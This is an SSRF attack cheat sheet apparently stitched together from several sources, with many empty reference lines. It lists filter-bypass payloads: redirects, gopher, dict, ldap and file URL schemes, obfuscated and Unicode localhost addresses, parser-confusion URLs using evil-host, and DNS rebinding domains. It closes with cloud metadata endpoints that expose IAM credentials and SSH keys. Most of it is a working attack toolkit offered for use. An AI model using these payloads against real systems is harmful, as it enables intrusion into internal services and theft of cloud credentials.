SSRF Proxy is a multi-threaded HTTP proxy server designed to tunnel client HTTP traffic through HTTP servers vulnerable to Server-Side Request Forgery (SSRF).

---

Credits:

Thank you to the following people that have contributed to this post:

- [@Rhynorater - Numerous contributions towards this blog post](https://twitter.com/Rhynorater)
- [@nnwakelam - Solr Shards SSRF](https://twitter.com/nnwakelam)
- [@marcioalm - Tomcat 6 Gopher RCE](https://twitter.com/marcioalm)
- [@vtnahira - OpenTSDB RCE](https://twitter.com/vtnahira)
- [@fransrosen - SSRF canaries concept](https://twitter.com/fransrosen)
- [@theabrahack - RCE via Jenkins Groovy](https://twitter.com/@theabrahack)
- [@qtc_de - RCE via Java RMI](https://twitter.com/qtc_de)

##
##
##
###################################

Server Side Request Forgery

###################################
##
##

Server-side request forgery (or SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.
In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems.
Bypass filters
Applications often block input containing non-whitelist hostnames, sensitive URLs, or IP addresses like loopback, IPv4 link-local, , etc. In this situation, it is sometimes possible to bypass the filter using various techniques.
Redirection
You can try using a redirection to the desired URL to bypass the filter. To do this, return a response with the 3xx code and the desired URL in the Location header to the request from the vulnerable server, for example:
HTTP/1.1 301 Moved Permanently
Server: nginx
Connection: close
Content-Length: 0
Location: http://127.0.0.1
You can achieve redirection in the following ways:
bash, like nc -lvp 80 < response.txt
URL shortener services
Mock and webhook services, see ​
More flexible solutions such as a simple HTTP server on python
Also, if the application contains an open redirection vulnerability you can use it to bypass the URL filter, for example:
POST /api/v1/webhook HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
​
url=https://vulnerable-website.com/api/v1/project/next?currentProjectId=1929851&path=http://127.0.0.1
These bypass approaches work because the application only validates the provided URL, which triggers the redirect. It follows the redirect and makes a request to the internal URL of the attacker's choice.
URL scheme
You can try using different URL schemes to bypass the filter:
file://path/to/file
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
dict://127.0.0.1:1337/stats
ftp://127.0.0.1/
sftp://attacker-website.com:1337/
tftp://attacker-website.com:1337/TESTUDPPACKET
ldap://127.0.0.1:389/%0astats%0aquit
ldaps://127.0.0.1:389/%0astats%0aquit
ldapi://127.0.0.1:389/%0astats%0aquit
gopher://attacker-website.com/_SSRF%0ATest!
IP address formats
You can try using a different IP address format to bypass the filter.
Rare IP address
Rare IP address formats, defined in :
Dotted hexadecimal IP: 0x7f.0x0.0x0.0x1
Dotless hexadecimal IP: 0x7f001
Dotless hexadecimal IP with padding: 0x0a0b0c0d7f000001 (padding is 0a0b0c0d)
Dotless decimal IP: 2130706433
Dotted decimal IP with overflow (256): 383.256.256.257
Dotted octal IP: 0177.0.0.01
Dotless octal IP: 017700000001
Dotted octal IP with padding: 00177.000.0000.000001
Combined:
0x7f.0.1
0x7f.1
00177.1
00177.0x0.1
You can short-hand IP addresses by dropping the zeros:
1 part  (ping A)       : 0.0.0.A
2 parts (ping A.B)     : A.0.0.B
3 parts (ping A.B.C)   : A.B.0.C
4 parts (ping A.B.C.D) : A.B.C.D
​
0       => 0.0.0.0
127.1   => 127.0.0.1
127.0.1 => 127.0.0.1
IPv6 address
IPv6 localhost:
[::]
0000::1
[::1]
0:0:0:0:0:0:0:0
IPv4-mapped IPv6 address: [::ffff:7f00:1]
IPv4-mapped IPv6 address: [::ffff:127.0.0.1]
IPv4-compatible IPv6 address (deprecated, q.v. : [::127.0.0.1]
IPv4-mapped IPv6 address with : [::ffff:7f00:1%25]
IPv4-mapped IPv6 address with : [::ffff:127.0.0.1%eth0]
Abuse of enclosed alphanumerics
Enclosed alphanumerics is a Unicode block of typographical symbols of an alphanumeric within a circle, a bracket or other not-closed enclosure, or ending in a full stop, q.v. .
127。0。0。1
127｡0｡0｡1
127．0．0．1
⑫７｡⓪．𝟢。𝟷
𝟘𝖃𝟕𝒇｡𝟘𝔵𝟢｡𝟢𝙭⓪｡𝟘𝙓¹
⁰𝔁𝟳𝙛𝟢０１
２𝟏𝟑𝟢𝟕𝟢６𝟺𝟛𝟑
𝟥𝟪³。𝟚⁵𝟞。²₅𝟞。²𝟧𝟟
𝟢₁𝟳₇｡０｡０｡𝟢𝟷
𝟎𝟢𝟙⑦⁷。０００。𝟶𝟬𝟢𝟘。𝟎₀𝟎𝟢０𝟣
[::𝟏②₇．𝟘．₀．𝟷]
[::𝟭２𝟟｡⓪｡₀｡𝟣%𝟸𝟭⑤]
[::𝚏𝕱ᶠ𝕗:𝟏₂７｡₀｡𝟢｡①]
[::𝒇ℱ𝔣𝐹:𝟣𝟤７。₀。０。₁%②¹𝟧]
𝟎𝚇𝟕𝖋｡⓪｡𝟣
𝟎ˣ𝟩𝘍｡𝟷
𝟘𝟘①𝟕⑦．１
⓪𝟘𝟙𝟳𝟽｡𝟎𝓧₀｡𝟏
Abusing a bug in Ruby's native resolver
Resolv::getaddresses is OS-dependent, therefore by playing around with different IP formats one can return blank values.
Proof of concept:
irb(main):001:0> require 'resolv'
=> true
irb(main):002:0> uri = "0x7f.1"
=> "0x7f.1"
irb(main):003:0> server_ips = Resolv.getaddresses(uri)
=> [] # The bug!
irb(main):004:0> blocked_ips = ["127.0.0.1", "::1", "0.0.0.0"]
=> ["127.0.0.1", "::1", "0.0.0.0"]
irb(main):005:0> (blocked_ips & server_ips).any?
=> false # Bypass
References:
​​
​​
​​
Broken parser
The  contains a number of features that are liable to be overlooked when implementing ad hoc parsing and validation of URLs:
Embedded credentials in a URL before the hostname, using the @ character: https://expected-host@evil-host
Indication a URL fragment using the # character: https://evil-host#expected-host
DNS naming hierarchy: https://expected-host.evil-host
URL-encode characters. This can help confuse URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
Combinations of these techniques together:
foo@evil-host:80@expected-host
foo@evil-host%20@expected-host
evil-host%09expected-host
127.1.1.1:80\@127.2.2.2:80
127.1.1.1:80:\@@127.2.2.2:80
127.1.1.1:80#\@127.2.2.2:80
ß.evil-host
References:
​​
​​
DNS pinning
If you want to get a A-record that resolves to an IP, use the following subdomain:
make-<IP>-rr.1u.ms 
For example, domain resolves make-127-0-0-1-rr.1u.ms to 127.0.0.1:
$ dig A make-127-0-0-1-rr.1u.ms
make-127-0-0-1-rr.1u.ms. 0	IN	A	127.0.0.1
Multiple records can be separated by -and-:
make-<IP>-and-<IP>-rr.1u.ms
For example, domain resolves make-127-0-0-1-and-127-127-127-127-rr.1u.ms to 127.0.0.1 and 127.127.127.127:
$ dig A make-127-0-0-1-and-127-127-127-127-rr.1u.ms
make-127-0-0-1-and-127-127-127-127-rr.1u.ms. 0 IN A 127.0.0.1
make-127-0-0-1-and-127-127-127-127-rr.1u.ms. 0 IN A 127.127.127.127
See more ​
DNS rebinding
If the mechanisms in vulnerable application for checking and establishing a connection are independent and there is no caching of the DNS resolution response, you can bypass this by manipulating the DNS resolution response.
For example, if two requests go one after the other within 5 seconds, DNS resolution make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms will return the address 1.1.1.1 by the first request, and the second - 127.0.0.1.
$ dig A make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms
make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms. 0 IN A 1.1.1.1
​
$ dig A make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms
make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms. 0 IN A 127.0.0.1
See more ​
Adobe ColdFusion
FFmpeg
​​
​​
​​
​​
​​
SVG
Server-side processing of arbitrary HTML and JS
Server-side processing of arbitrary HTML and JS data from the user can often be found when generating various documents, for example, in PDF format. If this functionality is vulnerable to HTML injection and/or XSS, you can try using this to access internal resources:
<iframe src="file:///etc/passwd" width="400" height="400">
<img src onerror="document.write('<iframe src=//127.0.0.1></iframe>')">
References:
​​
​​
Request splitting
HTTP headers
Many applications use in their flows IP addresses/domains, which they received directly from users in different HTTP headers, such as the X-Forwarded-For or Client-IP headers. Such application functionality can lead to a blind SSRF vulnerability if the header values are not properly validated.
This is where the  can be useful for searching the HTTP headers.
Referer header
Also notice the Referer header, which is used by server-side analytics software to track visitors. Such software often logs the Referer header from requests, since this allows to track incoming links.
The analytics software will actually visit any third-party URL that appears in the Referer header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links. As a result, the Referer header often represents fruitful attack surface for SSRF vulnerabilities.
References
​​
​​
​​
​​
​​
​​
​​

####################################################
###################################################
## AWS
# from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories

http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key

# AWS - Dirs 

http://169.254.169.254/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/public-keys/

## Google Cloud
#  https://cloud.google.com/compute/docs/metadata
#  - Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"

http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Google allows recursive pulls 
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true

## Google
#  Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)

http://metadata.google.internal/computeMetadata/v1beta1/

## Digital Ocean
# https://developers.digitalocean.com/documentation/metadata/

http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

## Packetcloud

https://metadata.packet.net/userdata

## Azure
#  Limited, maybe more exist?
# https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
http://169.254.169.254/metadata/v1/maintenance

## Update Apr 2017, Azure has more support; requires the header "Metadata: true"
# https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text

## OpenStack/RackSpace 
# (header required? unknown)
http://169.254.169.254/openstack

## HP Helion 
# (header required? unknown)
http://169.254.169.254/2009-04-04/meta-data/ 

## Oracle Cloud
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/

## Alibaba
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
